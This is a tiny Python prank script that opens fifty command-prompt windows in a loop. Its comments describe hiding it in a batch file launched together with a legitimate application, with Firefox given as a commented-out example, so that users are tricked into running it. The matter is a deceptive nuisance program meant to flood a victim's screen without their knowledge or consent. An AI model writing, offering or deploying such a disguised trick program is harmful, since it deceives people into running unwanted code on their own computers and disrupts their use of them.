import os
import sys

#Use this to open any application that you want to anchor this file to
#Create a batch file and launch this program along with the target to trick the user into running it >:)
#os.system("start firefox")

for x in range(50):
    os.system("start cmd")
